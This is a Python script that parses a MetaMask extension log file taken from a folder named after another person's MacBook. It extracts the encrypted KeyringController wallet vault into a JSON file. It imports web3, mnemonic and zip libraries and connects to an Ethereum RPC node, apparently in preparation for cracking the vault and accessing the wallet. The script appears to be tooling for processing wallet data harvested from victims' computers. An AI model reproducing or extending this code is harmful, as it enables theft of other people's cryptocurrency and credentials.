from web3 import Web3
from mnemonic import Mnemonic
from eth_account import Account
import time
import sys
from datetime import datetime
import pyminizip
import os
import json

Account.enable_unaudited_hdwallet_features()
web3 = Web3(Web3.HTTPProvider('https://rpc.mevblocker.io'))

num = 1
print('loading log file...')
dirname = 'D:\\DOSGAMES\\MAC_data\\tm_ldb\\Christophers-MacBook-Pro.local\\'
logfilename = 'D:\\DOSGAMES\\MAC_data\\tm_ldb\\Christophers-MacBook-Pro.local\\1738156972\\86_0_0_nkbihfbeogaeaoehlefnkodbefgpgknn_001144.log'
try:
    with open(logfilename, 'r', encoding='utf8') as f:
        data = f.read()
        print('urf-8 encoding has been detected.')
except:
    print('')

try:
    with open(logfilename, 'r', encoding='unicode_escape') as f:
        data = f.read()
        print('unicode_escape encoding has been detected.')
except:
    print('')

try:
    with open(logfilename, 'r', encoding='iso-8859-1') as f:
        data = f.read()
        print('iso-8859-1 encoding has been detected.')
except:
    print('')

try:
    with open(logfilename, 'r', encoding='ascii') as f:
        data = f.read()
        print('ascii encoding has been detected.')
except:
    print('')
    
f.close()
print('log file has been loaded successfully.')
startidx = data.find('KeyringController')
if startidx < 0:
    print('no KeyringController keyword.')
    exit(0)
else:
    startidx = startidx + 29


endidx = 0

endidx = data[startidx:].find('}"}') + startidx + 5
if endidx < 0:
    print('no address.')
    exit(0)
else:
    endidx = endidx - 4


keyringstr = data[startidx:endidx].replace('\"', '"')
keyringstr = data[startidx:endidx].replace('\\"', '"')

vaultfilename = dirname + 'vault_auto.json'
with open(vaultfilename, "w") as file:
    file.write(keyringstr)

file.close()
print('Extract vault has been done.')


